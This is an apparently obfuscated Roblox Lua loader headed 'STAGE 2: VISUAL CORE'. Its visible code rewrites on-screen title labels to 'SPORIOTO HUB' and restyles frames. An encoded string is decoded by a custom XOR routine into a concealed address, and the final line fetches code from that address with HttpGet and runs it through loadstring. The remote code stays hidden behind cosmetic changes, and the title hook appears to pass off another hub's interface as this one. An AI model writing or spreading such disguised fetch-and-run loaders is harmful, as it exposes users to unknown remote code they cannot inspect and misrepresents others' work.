
--[[ STAGE 2: VISUAL CORE ]]
local lhaAEu50hi7TrJP="\215\202\209\212\222\172\200\207\249\015\012\234\042\051\037\064\052\072\066\071\096\084\108\127\133\114\138\154\135\104\164\183\188\133\203\211\217\211\230\229\244\239\003\239\007\217\019\010\040\041\056\043\060\078\085\031\100\095\110\122\066\105\081\103\118\136\158\178\175\145\137\201\204\209\218\187\210\248\253\001\013\011\236\231\035\043\025\015\029\063\055\089\050\045\112\093\097\121\130\099\061\066\159\163\094\096\104\114\145\214\198\217"local u2Lwk0t1G9ATCxeu_t5_=144 local U102imHcyIXouaCRpa=208 local YHtl6VASVOwXxLlsA10f3m=0 local jZqRzB6ieFUds9=7 local FD_imN6Lk4xV_zv10XHyp=8 local TtsAyLYaUZqK4H=false local ilZjs2Pfwobv9JLgju4=bit32 and bit32.bxor if not ilZjs2Pfwobv9JLgju4 then ilZjs2Pfwobv9JLgju4=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local f5heI4u8FOUuEBz={}for _DzBCrKXCcnXMi=1,#lhaAEu50hi7TrJP do local H9TWUepwIqkXUWyjoUa=string.byte(lhaAEu50hi7TrJP,_DzBCrKXCcnXMi)local uri17ql1l8PKh02iWr=(U102imHcyIXouaCRpa+(_DzBCrKXCcnXMi*jZqRzB6ieFUds9)+FD_imN6Lk4xV_zv10XHyp)%256 if YHtl6VASVOwXxLlsA10f3m==0 then H9TWUepwIqkXUWyjoUa=(H9TWUepwIqkXUWyjoUa-uri17ql1l8PKh02iWr)%256 f5heI4u8FOUuEBz[_DzBCrKXCcnXMi]=string.char(ilZjs2Pfwobv9JLgju4(H9TWUepwIqkXUWyjoUa,u2Lwk0t1G9ATCxeu_t5_))else H9TWUepwIqkXUWyjoUa=ilZjs2Pfwobv9JLgju4(H9TWUepwIqkXUWyjoUa,u2Lwk0t1G9ATCxeu_t5_)f5heI4u8FOUuEBz[_DzBCrKXCcnXMi]=string.char((H9TWUepwIqkXUWyjoUa-uri17ql1l8PKh02iWr)%256)end end local ZcjWAby6gciKKi=table.concat(f5heI4u8FOUuEBz)if TtsAyLYaUZqK4H then ZcjWAby6gciKKi=string.reverse(ZcjWAby6gciKKi)end local h0pmGSoQckX45t6GJP9=ZcjWAby6gciKKi
local HubName = "SPORIOTO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(h0pmGSoQckX45t6GJP9))()
